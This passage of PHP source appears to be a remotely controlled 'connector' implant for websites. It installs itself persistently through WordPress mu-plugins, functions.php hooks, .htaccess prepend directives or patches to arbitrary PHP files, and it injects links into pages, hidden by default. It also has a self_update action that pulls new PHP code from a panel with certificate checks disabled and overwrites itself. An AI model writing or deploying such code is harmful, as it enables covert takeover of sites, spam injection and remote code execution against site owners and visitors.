        return file_exists($target) ? [true, 'dynamic_hook_ok'] : [false, 'mu_plugin_missing'];
    }
    if ($placement['strategy'] === 'wp_functions_hook') {
        return file_exists($target) ? [true, 'dynamic_hook_ok'] : [false, 'functions_hook_missing'];
    }
    return file_exists($target) ? [true, 'dynamic_hook_ok'] : [false, 'dynamic_hook_missing'];
}

function ensure_render_delivery($forceReinstall = false) {
    $config = load_config();
    $siteInfo = detect_site_info();
    $placement = $config['placement'] ?? default_placement_state();
    $verified = [false, 'not_checked'];
    if (!$forceReinstall) {
        $verified = verify_current_placement($config);
        if ($verified[0]) {
            $placement['status'] = 'installed';
            $placement['verify_status'] = $verified[1];
            $placement['last_verified_at'] = gmdate('c');
            $config['placement'] = $placement;
            save_config($config);
            refresh_current_placement($config);
            return [true, $config, ['verified' => true, 'message' => $verified[1]]];
        }
    }
    foreach (build_strategy_chain($siteInfo) as $strategy) {
        $nowIso = gmdate('c');
        if (is_string($strategy)) {
            if ($strategy === 'wp_mu_plugin') {
                list($ok, $target, $mode, $msg) = install_mu_plugin($siteInfo);
                $marker = placement_marker('wp_mu_plugin');
                $strategyName = 'wp_mu_plugin';
            } elseif ($strategy === 'wp_functions_hook') {
                list($ok, $target, $mode, $msg) = install_functions_hook($siteInfo);
                $marker = placement_marker('wp_functions_hook');
                $strategyName = 'wp_functions_hook';
            } elseif ($strategy === 'htaccess_prepend') {
                list($ok, $target, $mode, $msg, $marker) = install_htaccess_prepend($siteInfo);
                $strategyName = 'htaccess_prepend';
            } elseif ($strategy === 'any_php_file') {
                list($ok, $target, $mode, $msg, $marker) = install_any_php_file($siteInfo);
                $strategyName = 'any_php_file';
            } else {
                continue;
            }
        } else {
            $strategyName = $strategy[2];
            list($ok, $target, $mode, $msg, $marker) = install_file_patch($strategy[1], $strategy[2]);
        }
        $config = append_placement_history($config, [
            'at' => $nowIso,
            'strategy' => $strategyName,
            'target' => $target,
            'install_mode' => $mode,
            'success' => (bool)$ok,
            'message' => $msg,
        ]);
        if ($ok) {
            $config['placement'] = [
                'status' => 'installed',
                'strategy' => $strategyName,
                'target' => $target,
                'install_mode' => $mode,
                'marker' => $marker,
                'message' => $msg,
                'installed_at' => $config['placement']['installed_at'] ?: $nowIso,
                'last_attempt_at' => $nowIso,
                'last_verified_at' => $nowIso,
                'verify_status' => 'installed',
                'history' => $config['placement']['history'],
            ];
            save_config($config);
            refresh_current_placement($config);
            $links = load_links();
            foreach ($links as $id => $row) {
                $links[$id] = apply_placement_snapshot_to_link($row, $config['placement']);
            }
            save_links($links);
            return [true, $config, ['verified' => false, 'message' => $msg]];
        }
    }
    $config['placement']['status'] = 'failed';
    $config['placement']['last_attempt_at'] = gmdate('c');
    $config['placement']['message'] = 'no_strategy_succeeded';
    save_config($config);
    return [false, $config, ['verified' => false, 'message' => 'no_strategy_succeeded']];
}

function placement_report_payload() {
    $config = load_config();
    $siteInfo = detect_site_info();
    $links = load_links();
    $stats = get_link_stats($links);
    list($ok, $verifyMessage) = verify_current_placement($config);
    $config['placement']['last_verified_at'] = gmdate('c');
    $config['placement']['verify_status'] = $verifyMessage;
    save_config($config);
    return [
        'version' => CONNECTOR_VERSION,
        'site_info' => $siteInfo,
        'placement' => $config['placement'],
        'link_stats' => $stats,
        'render_profile' => $config['render_profile'],
        'render_types' => $config['render_types'],
        'placement_ok' => $ok,
    ];
}

function verify_links_action() {
    $links = load_links();
    $config = load_config();
    $nowIso = gmdate('c');
    foreach ($links as $id => $row) {
        $row['last_verified_at'] = $nowIso;
        $links[$id] = apply_placement_snapshot_to_link($row, $config['placement']);
    }
    save_links($links);
    return placement_report_payload();
}

function clear_expired_links() {
    $links = load_links();
    $active = [];
    $removed = [];
    $now = time();
    foreach ($links as $id => $row) {
        $expiresAt = isset($row['expires_at']) ? intval($row['expires_at']) : 0;
        if (!empty($expiresAt) && $expiresAt > 0 && $expiresAt < $now) {
            $removed[] = $id;
            continue;
        }
        $active[$id] = $row;
    }
    save_links($active);
    refresh_current_placement(load_config());
    return [$active, $removed];
}

function self_reconcile_action() {
    $links = load_links();
    $merged = [];
    $removedDuplicates = 0;
    foreach ($links as $row) {
        $id = build_deterministic_link_id($row['url'], $row['anchor'], $row['rel']);
        if (isset($merged[$id])) {
            $removedDuplicates++;
            $existingExp = isset($merged[$id]['expires_at']) ? intval($merged[$id]['expires_at']) : 0;
            $incomingExp = isset($row['expires_at']) ? intval($row['expires_at']) : 0;
            if ($incomingExp > $existingExp) {
                $merged[$id]['expires_at'] = $incomingExp;
            }
            if (!empty($row['render_types'])) {
                $merged[$id]['render_types'] = filter_render_types(array_merge($merged[$id]['render_types'], $row['render_types']));
            }
        } else {
            $row['id'] = $id;
            $merged[$id] = $row;
        }
    }
    save_links($merged);
    list($active, $expiredRemoved) = clear_expired_links();
    list($ok, $config, $placement) = ensure_render_delivery(false);
    return [
        'reconciled' => true,
        'placement_ok' => $ok,
        'removed_duplicate_entries' => $removedDuplicates,
        'removed_expired_entries' => count($expiredRemoved),
        'placement' => placement_report_payload(),
    ];
}

if (defined('ROOTSEO_CONNECTOR_EMBED_RENDER') && ROOTSEO_CONNECTOR_EMBED_RENDER === true) {
    echo rootseo_render_links_html();
    return;
}

$req = get_request_data();
$action = get_action_name($req);

if (!in_array($action, ['ping', 'capabilities', 'output'], true)) {
    authenticate_protected_request();
}

switch ($action) {
    case 'ping':
        $links = load_links();
        $config = load_config();
        $stats = get_link_stats($links);
        $siteInfo = detect_site_info();
        list($placementOk, $verifyMessage) = verify_current_placement($config);
        respond(true, [
            'site' => $_SERVER['HTTP_HOST'] ?? 'unknown',
            'site_name' => $siteInfo['site_name'],
            'site_type' => $siteInfo['site_type'],
            'language' => $siteInfo['language'],
            'country' => $siteInfo['country'],
            'version' => CONNECTOR_VERSION,
            'connector_family' => 'v5',
            'keyless' => true,
            'auth_mode' => 'panel_token',
            'output_mode' => strtolower(trim((string)($config['output_mode'] ?? 'hidden_pack'))),
            'render_profile' => $config['render_profile'],
            'render_types' => $config['render_types'],
            'links_total' => $stats['total'],
            'links_active' => $stats['active'],
            'links_expired' => $stats['expired'],
            'footer_detected' => $siteInfo['footer_detected'],
            'footer_writable' => $siteInfo['footer_writable'],
            'placement_ok' => $placementOk,
            'placement_strategy' => $config['placement']['strategy'],
            'placement_target' => $config['placement']['target'],
            'placement_verify_status' => $verifyMessage,
            'supports' => ['add_link', 'remove_link', 'get_links', 'sync_links', 'clear_links', 'clear_expired', 'info', 'diagnose', 'verify_links', 'self_reconcile', 'placement_report', 'output']
        ], 'ok');
        break;

    case 'capabilities':
        respond(true, [
            'version' => CONNECTOR_VERSION,
            'auth' => ['panel_token', 'optional_replay_headers'],
            'rels' => ['dofollow', 'nofollow', 'ugc', 'sponsored'],
            'render_types' => default_render_types(),
            'placement_strategies' => ['wp_mu_plugin', 'wp_functions_hook', 'footer_patch', 'wp_active_footer', 'index_patch', 'htaccess_prepend', 'any_php_file'],
            'limits' => [
                'max_links_per_sync' => MAX_LINKS_PER_SYNC,
                'max_anchor_length' => MAX_ANCHOR_LENGTH,
                'max_url_length' => MAX_URL_LENGTH,
                'max_request_bytes' => MAX_REQUEST_BYTES,
            ],
            'actions' => ['ping', 'capabilities', 'info', 'diagnose', 'verify_links', 'self_reconcile', 'placement_report', 'add_link', 'remove_link', 'get_links', 'sync_links', 'clear_links', 'clear_expired', 'output', 'set_config', 'get_config', 'self_update']
        ], 'capabilities');
        break;

    case 'info':
        respond(true, detect_site_info(), 'info');
        break;

    case 'diagnose':
        $siteInfo = detect_site_info();
        $links = load_links();
        $stats = get_link_stats($links);
        $config = load_config();
        list($placementOk, $verifyMessage) = verify_current_placement($config);
        $diag = [
            'version' => CONNECTOR_VERSION,
            'file_permissions' => [
                'links_file' => LINKS_FILE,
                'links_file_exists' => file_exists(LINKS_FILE),
                'links_dir_writable' => is_writable(dirname(LINKS_FILE)),
                'config_file' => CONFIG_FILE,
                'config_file_exists' => file_exists(CONFIG_FILE),
                'config_dir_writable' => is_writable(dirname(CONFIG_FILE)),
                'nonces_file' => NONCES_FILE,
                'nonces_file_exists' => file_exists(NONCES_FILE),
                'prepend_helper_file' => PREPEND_HELPER_FILE,
                'prepend_helper_exists' => file_exists(PREPEND_HELPER_FILE),
            ],
            'link_stats' => $stats,
            'output_mode' => strtolower(trim((string)($config['output_mode'] ?? 'hidden_pack'))),
            'render_profile' => $config['render_profile'],
            'render_types' => $config['render_types'],
            'placement' => $config['placement'],
            'placement_ok' => $placementOk,
            'placement_verify_status' => $verifyMessage,
            'site_info' => $siteInfo,
            'php_settings' => [
                'php_version' => phpversion(),
                'allow_url_fopen' => ini_get('allow_url_fopen'),
                'open_basedir' => ini_get('open_basedir') ?: 'not_set',
                'max_execution_time' => ini_get('max_execution_time'),
            ],
            'recommendations' => [],
        ];
        if (!$diag['file_permissions']['links_dir_writable']) $diag['recommendations'][] = 'links_dir_not_writable';
        if (empty($siteInfo['footer_paths'])) $diag['recommendations'][] = 'no_footer_paths_detected';
        if (!$placementOk) $diag['recommendations'][] = 'placement_needs_reinstall';
        respond(true, $diag, 'diagnose');
        break;

    case 'get_links':
        $links = load_links();
        $stats = get_link_stats($links);
        respond(true, [
            'links' => array_values($links),
            'total' => $stats['total'],
            'active' => $stats['active'],
            'expired' => $stats['expired'],
            'placement' => load_config()['placement'],
            'render_types' => load_config()['render_types'],
        ], 'links');
        break;

    case 'add_link':
        $url = validate_url_value($req['url'] ?? '');
        $anchor = validate_anchor_text($req['anchor'] ?? '');
        $rel = normalize_rel($req['rel'] ?? 'dofollow');
        $expiresAt = isset($req['expires_at']) ? intval($req['expires_at']) : null;
        if ($url === '' || $anchor === '') respond(false, [], 'invalid_url_or_anchor', 400);
        $config = load_config();
        $existingLinks = load_links();
        $backup = $existingLinks;
        $linkId = validate_link_id($req['id'] ?? '');
        if ($linkId === '') $linkId = build_deterministic_link_id($url, $anchor, $rel);
        // v5.3: render_types now honoured from payload (panel can force a single variant per link).
        $reqRenderTypes = isset($req['render_types']) ? $req['render_types'] : null;
        if (is_string($reqRenderTypes)) {
            $decoded = json_decode($reqRenderTypes, true);
            if (is_array($decoded)) $reqRenderTypes = $decoded;
            else $reqRenderTypes = array_filter(array_map('trim', explode(',', $reqRenderTypes)));
        }
        $effectiveRenderTypes = is_array($reqRenderTypes) && !empty($reqRenderTypes)
            ? filter_render_types($reqRenderTypes)
            : $config['render_types'];
        $row = [
            'id' => $linkId,
            'url' => $url,
            'anchor' => $anchor,
            'rel' => $rel,
            'expires_at' => $expiresAt,
            'created' => isset($existingLinks[$linkId]['created']) ? intval($existingLinks[$linkId]['created']) : time(),
            'updated_at' => time(),
            'render_profile' => $config['render_profile'],
            'render_types' => $effectiveRenderTypes,
            'cleanup_status' => 'active',
        ];
        $existingLinks[$linkId] = apply_placement_snapshot_to_link(normalize_link_row($linkId, $row, $config), $config['placement']);
        save_links($existingLinks);
        list($ok, $newConfig, $placementMeta) = ensure_render_delivery(false);
        if (!$ok) {
            save_links($backup);
            respond(false, [
                'link_id' => $linkId,
                'injected' => false,
                'placement_report' => placement_report_payload(),
            ], 'placement_install_failed', 500);
        }
        $finalLinks = load_links();
        $finalRow = $finalLinks[$linkId] ?? normalize_link_row($linkId, $row, $newConfig);
        respond(true, [
            'link_id' => $linkId,
            'injected' => true,
            'render_types' => $finalRow['render_types'],
            'placement_strategy' => $newConfig['placement']['strategy'],
            'placement_target' => $newConfig['placement']['target'],
            'placement_report' => placement_report_payload(),
        ], 'link_added');
        break;

    case 'remove_link':
        $linkId = validate_link_id($req['link_id'] ?? '');
        if ($linkId === '') respond(false, [], 'invalid_link_id', 400);
        $links = load_links();
        if (isset($links[$linkId])) {
            unset($links[$linkId]);
            if (!save_links($links)) respond(false, [], 'links_write_failed', 500);
            refresh_current_placement(load_config());
        }
        respond(true, ['removed' => true, 'placement_report' => placement_report_payload()], 'link_removed');
        break;

    case 'sync_links':
        $incoming = $req['links'] ?? [];
        if (is_string($incoming)) {
            $decoded = json_decode($incoming, true);
            if (is_array($decoded)) $incoming = $decoded;
        }
        if (!is_array($incoming)) respond(false, [], 'links_array_required', 400);
        if (count($incoming) > MAX_LINKS_PER_SYNC) respond(false, [], 'too_many_links', 400);
        $config = load_config();
        $current = load_links();
        $backup = $current;
        $final = [];
        $added = 0;
        $removed = 0;
        $unchanged = 0;
        foreach ($incoming as $row) {
            if (!is_array($row)) continue;
            $url = validate_url_value($row['url'] ?? '');
            $anchor = validate_anchor_text($row['anchor'] ?? '');
            if ($url === '' || $anchor === '') continue;
            $rel = normalize_rel($row['rel'] ?? 'dofollow');
            $id = validate_link_id($row['id'] ?? '');
            if ($id === '') $id = build_deterministic_link_id($url, $anchor, $rel);
            $normalized = normalize_link_row($id, [
                'id' => $id,
                'url' => $url,
                'anchor' => $anchor,
                'rel' => $rel,
                'expires_at' => isset($row['expires_at']) ? intval($row['expires_at']) : null,
                'created' => isset($current[$id]['created']) ? intval($current[$id]['created']) : time(),
                'updated_at' => time(),
                'render_profile' => $config['render_profile'],
                'render_types' => $row['render_types'] ?? $config['render_types'],
            ], $config);
            $normalized = apply_placement_snapshot_to_link($normalized, $config['placement']);
            if (!isset($current[$id])) {
                $added++;
            } else {
                $before = json_encode($current[$id], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
                $after = json_encode($normalized, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
                if ($before === $after) $unchanged++;
            }
            $final[$id] = $normalized;
        }
        foreach ($current as $id => $row) {
            if (!isset($final[$id])) $removed++;
        }
        save_links($final);
        list($ok, $newConfig, $placementMeta) = ensure_render_delivery(false);
        if (!$ok) {
            save_links($backup);
            respond(false, ['placement_report' => placement_report_payload()], 'placement_install_failed', 500);
        }
        respond(true, [
            'total' => count($final),
            'added' => $added,
            'removed' => $removed,
            'unchanged' => $unchanged,
            'placement_strategy' => $newConfig['placement']['strategy'],
            'placement_target' => $newConfig['placement']['target'],
            'placement_report' => placement_report_payload(),
        ], 'synced');
        break;

    case 'clear_links':
        if (!save_links([])) respond(false, [], 'links_write_failed', 500);
        refresh_current_placement(load_config());
        respond(true, ['cleared' => true, 'placement_report' => placement_report_payload()], 'links_cleared');
        break;

    case 'clear_expired':
        list($activeAfter, $expiredRemoved) = clear_expired_links();
        respond(true, [
            'cleared' => count($expiredRemoved),
            'remaining' => count($activeAfter),
            'placement_report' => placement_report_payload(),
        ], 'expired_links_cleared');
        break;

    case 'verify_links':
        respond(true, verify_links_action(), 'verified');
        break;

    case 'placement_report':
        respond(true, placement_report_payload(), 'placement_report');
        break;

    case 'self_reconcile':
        respond(true, self_reconcile_action(), 'reconciled');
        break;

    case 'get_config':
        $cfg = load_config();
        respond(true, [
            'output_mode' => $cfg['output_mode'],
            'render_profile' => $cfg['render_profile'],
            'render_types' => $cfg['render_types'],
            'link_rel_strategy' => $cfg['link_rel_strategy'],
            'placement' => $cfg['placement'],
        ], 'config');
        break;

    case 'set_config':
        // Panel can change output_mode, render_types, render_profile, link_rel_strategy.
        // Placement state is NOT changed via this endpoint (use add_link / verify_links).
        $cfg = load_config();
        $allowedOutputModes = ['visible', 'hidden_pack'];
        $allowedRelStrategies = ['preserve', 'force_sponsored', 'force_nofollow'];
        if (isset($req['output_mode'])) {
            $om = strtolower(trim((string)$req['output_mode']));
            if (!in_array($om, $allowedOutputModes, true)) respond(false, [], 'invalid_output_mode', 400);
            $cfg['output_mode'] = $om;
        }
        if (isset($req['render_profile'])) {
            $cfg['render_profile'] = trim((string)$req['render_profile']) ?: $cfg['render_profile'];
        }
        if (isset($req['render_types'])) {
            $rt = $req['render_types'];
            if (is_string($rt)) {
                $decoded = json_decode($rt, true);
                $rt = is_array($decoded) ? $decoded : array_filter(array_map('trim', explode(',', $rt)));
            }
            if (!is_array($rt) || empty($rt)) respond(false, [], 'invalid_render_types', 400);
            $cfg['render_types'] = filter_render_types($rt);
        }
        if (isset($req['link_rel_strategy'])) {
            $rs = strtolower(trim((string)$req['link_rel_strategy']));
            if (!in_array($rs, $allowedRelStrategies, true)) respond(false, [], 'invalid_rel_strategy', 400);
            $cfg['link_rel_strategy'] = $rs;
        }
        if (!save_config($cfg)) respond(false, [], 'config_write_failed', 500);
        respond(true, [
            'output_mode' => $cfg['output_mode'],
            'render_profile' => $cfg['render_profile'],
            'render_types' => $cfg['render_types'],
            'link_rel_strategy' => $cfg['link_rel_strategy'],
        ], 'config_updated');
        break;

    case 'self_update':
        // Pull fresh PHP from panel and atomically replace this file.
        // Requires PANEL_API_URL to be a real value (placeholder safety).
        $apiUrl = trim((string)PANEL_API_URL);
        if ($apiUrl === '' || strpos($apiUrl, '{{') !== false) {
            respond(false, [], 'panel_api_url_missing', 400);
        }
        $sourceUrl = rtrim($apiUrl, '/') . '/connector/v5/source';
        $expectedVersion = isset($req['expected_version']) ? trim((string)$req['expected_version']) : '';
        $headers = [
            'X-RS-Panel-Token: ' . PANEL_TOKEN,
            'Accept: application/x-php',
            'User-Agent: rootseo-connector/' . CONNECTOR_VERSION,
        ];
        $newSource = '';
        $httpStatus = 0;
        if (function_exists('curl_init')) {
            $ch = curl_init($sourceUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 25,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_SSL_VERIFYPEER => false,
            ]);
            $newSource = (string)curl_exec($ch);
            $httpStatus = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
        } else {
            $ctx = stream_context_create([
                'http' => [
                    'method' => 'GET',
                    'header' => implode("\r\n", $headers),
                    'timeout' => 25,
                ],
                'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
            ]);
            $newSource = (string)@file_get_contents($sourceUrl, false, $ctx);
            $httpStatus = 200; // unknown; trust if non-empty
        }
        if ($httpStatus !== 200 || $newSource === '' || strpos($newSource, '<?php') === false) {
            respond(false, ['http_status' => $httpStatus], 'source_fetch_failed', 502);
        }
        if (strpos($newSource, "ROOT-SEO Connector") === false) {
            respond(false, [], 'source_signature_mismatch', 502);
        }
        // Backup current file then atomic replace.
        $self = __FILE__;
        $backup = $self . '.bak.v' . CONNECTOR_VERSION . '.' . time();
        if (!@copy($self, $backup)) respond(false, [], 'backup_failed', 500);
        $tmp = $self . '.tmp.' . bin2hex(random_bytes(4));
        if (@file_put_contents($tmp, $newSource) === false) {
            @unlink($tmp);
            respond(false, [], 'tmp_write_failed', 500);
        }
        if (!@rename($tmp, $self)) {
            @unlink($tmp);
            respond(false, [], 'rename_failed', 500);
        }
        // OPcache invalidation: self-update sonrası eski PHP cache'de kalmasın.
        // Olmayan sunucularda hata fırlatmaz (function_exists check).
        $opcacheCleared = false;
        if (function_exists('opcache_invalidate')) {
            $opcacheCleared = @opcache_invalidate($self, true);
        }
        if (!$opcacheCleared && function_exists('opcache_reset')) {
            $opcacheCleared = (bool)@opcache_reset();
        }
        respond(true, [
            'old_version' => CONNECTOR_VERSION,
            'fetched_bytes' => strlen($newSource),
            'backup_path' => $backup,
            'opcache_cleared' => $opcacheCleared,
            'requested_version' => $expectedVersion ?: null,
        ], 'self_updated');
        break;

    case 'output':
        header('Content-Type: text/html; charset=UTF-8');
        echo rootseo_render_links_html();
        exit;

    default:
        respond(false, [], 'unknown_action', 404);
}
